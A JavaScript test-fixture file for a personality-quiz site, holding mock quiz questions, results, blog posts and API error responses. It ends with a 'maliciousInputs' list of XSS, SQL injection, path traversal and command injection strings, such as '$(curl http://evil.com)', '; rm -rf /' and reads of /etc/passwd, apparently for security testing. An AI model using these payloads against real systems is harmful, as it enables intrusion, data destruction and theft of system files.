export const mockQuizData = {
  basicQuiz: {
    id: 1,
    title: 'Personality Assessment',
    description: 'Discover your personality type',
    questionCount: 5,
    questions: [
      {
        id: 1,
        text: 'How do you prefer to spend your free time?',
        options: [
          { id: 1, text: 'Reading a book alone', value: 'introvert' },
          { id: 2, text: 'Going to a party', value: 'extrovert' },
          { id: 3, text: 'Small gathering with close friends', value: 'ambivert' },
          { id: 4, text: 'Trying something new', value: 'adventurous' }
        ]
      },
      {
        id: 2,
        text: 'How do you approach problems?',
        options: [
          { id: 1, text: 'Analyze all options carefully', value: 'analytical' },
          { id: 2, text: 'Trust my intuition', value: 'intuitive' },
          { id: 3, text: 'Seek others\' opinions', value: 'collaborative' },
          { id: 4, text: 'Act quickly on first instinct', value: 'impulsive' }
        ]
      },
      {
        id: 3,
        text: 'What motivates you most?',
        options: [
          { id: 1, text: 'Achievement and recognition', value: 'achievement' },
          { id: 2, text: 'Helping others', value: 'altruistic' },
          { id: 3, text: 'Learning new things', value: 'growth' },
          { id: 4, text: 'Stability and security', value: 'security' }
        ]
      },
      {
        id: 4,
        text: 'How do you handle stress?',
        options: [
          { id: 1, text: 'Make a plan to address it', value: 'structured' },
          { id: 2, text: 'Talk to someone about it', value: 'social' },
          { id: 3, text: 'Take time alone to recharge', value: 'solitary' },
          { id: 4, text: 'Distract myself with activities', value: 'avoidant' }
        ]
      },
      {
        id: 5,
        text: 'What describes your work style?',
        options: [
          { id: 1, text: 'Organized and methodical', value: 'organized' },
          { id: 2, text: 'Creative and flexible', value: 'creative' },
          { id: 3, text: 'Fast-paced and efficient', value: 'efficient' },
          { id: 4, text: 'Collaborative and supportive', value: 'teamwork' }
        ]
      }
    ]
  },
  
  quizList: [
    {
      id: 1,
      title: 'Big Five Personality Test',
      description: 'The scientific approach to personality',
      questionCount: 10,
      estimatedTime: '5 minutes',
      category: 'Scientific'
    },
    {
      id: 2,
      title: 'Quick Personality Check',
      description: 'Get insights in just 3 minutes',
      questionCount: 5,
      estimatedTime: '3 minutes',
      category: 'Quick'
    },
    {
      id: 3,
      title: 'Career Personality Match',
      description: 'Find your ideal career path',
      questionCount: 15,
      estimatedTime: '8 minutes',
      category: 'Career'
    }
  ],
  
  mockResults: {
    basic: {
      id: 'result-123',
      personalityType: 'INTJ',
      title: 'The Architect',
      description: 'Strategic, innovative, and determined',
      traits: {
        openness: 85,
        conscientiousness: 78,
        extraversion: 32,
        agreeableness: 45,
        neuroticism: 28
      },
      strengths: ['Strategic thinking', 'Independence', 'Determination'],
      weaknesses: ['Overly critical', 'Dismissive of emotions', 'Impatient'],
      careers: ['Scientist', 'Engineer', 'Strategic Planner', 'Software Developer']
    }
  }
};

export const mockBlogData = {
  posts: [
    {
      id: 1,
      slug: 'understanding-personality-types',
      title: 'Understanding Personality Types: A Comprehensive Guide',
      excerpt: 'Explore the fascinating world of personality psychology and discover how understanding personality types can improve your life.',
      author: 'Dr. Sarah Johnson',
      date: '2024-01-15',
      readTime: '8 min read',
      category: 'Psychology',
      tags: ['personality', 'psychology', 'self-discovery']
    },
    {
      id: 2,
      slug: 'personality-in-relationships',
      title: 'How Personality Affects Your Relationships',
      excerpt: 'Learn how different personality types interact and build stronger connections with others.',
      author: 'Michael Chen',
      date: '2024-01-10',
      readTime: '6 min read',
      category: 'Relationships',
      tags: ['relationships', 'communication', 'personality']
    }
  ],
  
  postContent: {
    'understanding-personality-types': {
      title: 'Understanding Personality Types: A Comprehensive Guide',
      author: 'Dr. Sarah Johnson',
      date: '2024-01-15',
      readTime: '8 min read',
      content: `
        <h2>What Are Personality Types?</h2>
        <p>Personality types are patterns of behavioral characteristics that help us understand how people think, feel, and behave in various situations.</p>
        
        <h3>The History of Personality Psychology</h3>
        <p>The study of personality has evolved significantly over the past century, from early theories by Freud to modern frameworks like the Big Five.</p>
        
        <h3>Why Understanding Personality Matters</h3>
        <ul>
          <li>Better self-awareness</li>
          <li>Improved relationships</li>
          <li>Career development</li>
          <li>Personal growth</li>
        </ul>
        
        <blockquote>
          "The curious paradox is that when I accept myself just as I am, then I can change." - Carl Rogers
        </blockquote>
        
        <h3>Common Personality Frameworks</h3>
        <p>There are several popular frameworks for understanding personality:</p>
        <ol>
          <li><strong>Myers-Briggs Type Indicator (MBTI)</strong> - 16 personality types based on four dimensions</li>
          <li><strong>Big Five (OCEAN)</strong> - Five major personality traits</li>
          <li><strong>Enneagram</strong> - Nine interconnected personality types</li>
          <li><strong>DISC Assessment</strong> - Four primary personality types</li>
        </ol>
      `
    }
  }
};

export const mockApiResponses = {
  success: {
    status: 200,
    headers: {
      'Content-Type': 'application/json',
      'X-Request-ID': 'test-request-123'
    }
  },
  
  errors: {
    badRequest: {
      status: 400,
      body: {
        error: 'Bad Request',
        message: 'Invalid request data',
        requestId: 'test-request-123',
        timestamp: new Date().toISOString()
      }
    },
    unauthorized: {
      status: 401,
      body: {
        error: 'Unauthorized',
        message: 'Please log in to continue',
        requestId: 'test-request-123',
        timestamp: new Date().toISOString()
      }
    },
    notFound: {
      status: 404,
      body: {
        error: 'Not Found',
        message: 'The requested resource was not found',
        requestId: 'test-request-123',
        timestamp: new Date().toISOString()
      }
    },
    serverError: {
      status: 500,
      body: {
        error: 'Internal Server Error',
        message: 'Something went wrong. Please try again later.',
        requestId: 'test-request-123',
        timestamp: new Date().toISOString()
      }
    },
    rateLimit: {
      status: 429,
      headers: {
        'X-RateLimit-Limit': '100',
        'X-RateLimit-Remaining': '0',
        'X-RateLimit-Reset': String(Math.floor(Date.now() / 1000) + 3600)
      },
      body: {
        error: 'Too Many Requests',
        message: 'Rate limit exceeded. Please try again later.',
        requestId: 'test-request-123',
        timestamp: new Date().toISOString()
      }
    }
  }
};

export const maliciousInputs = {
  xss: [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert("XSS")>',
    '<svg onload=alert("XSS")>',
    'javascript:alert("XSS")',
    '<iframe src="javascript:alert(\'XSS\')"></iframe>',
    '<input onfocus=alert("XSS") autofocus>',
    '<select onfocus=alert("XSS") autofocus>',
    '<textarea onfocus=alert("XSS") autofocus>',
    '<body onload=alert("XSS")>',
    '"><script>alert("XSS")</script>',
    '\'-alert("XSS")-\'',
    '\";alert("XSS");//',
    '</script><script>alert("XSS")</script>'
  ],
  
  sqlInjection: [
    '\' OR \'1\'=\'1',
    '1; DROP TABLE users;--',
    'admin\'--',
    '\' UNION SELECT * FROM users--',
    '1\' AND \'1\'=\'1',
    '"; DELETE FROM users WHERE 1=1;--'
  ],
  
  pathTraversal: [
    '../../../etc/passwd',
    '..\\..\\..\\windows\\system32\\config\\sam',
    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    '....//....//....//etc/passwd',
    '/var/www/../../etc/passwd'
  ],
  
  commandInjection: [
    '; ls -la',
    '| whoami',
    '`cat /etc/passwd`',
    '$(curl http://evil.com)',
    '& dir',
    '; rm -rf /'
  ]
};